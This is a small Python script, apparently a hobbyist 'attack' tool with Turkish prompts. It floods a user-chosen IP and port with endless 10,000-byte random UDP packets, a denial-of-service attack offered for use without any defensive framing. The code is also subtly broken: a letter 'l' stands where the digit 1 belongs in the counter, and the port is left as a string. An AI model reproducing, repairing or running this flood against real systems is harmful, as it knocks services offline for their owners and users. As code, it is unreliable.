import socket
import random
import os


os.system("clear")
banner="""
######################
CODER BY DEATH       #
                     #
                     #
                     #
                     #
######################


"""
print(banner)


hedef_ip= input("hedef ip: ")
hedef_port=input("hedef port: ")

bytes=random._urandom(10000)
sock=socket.socket(socket.AF_INET,socket
.SOCK_DGRAM)
sayac=0
while True:
        sock.sendto(bytes,(hedef_ip,hedef_port))
        sayac=sayac+l
        print("saldiri baslatildi.gonderilen paket:%s"%(sayac))
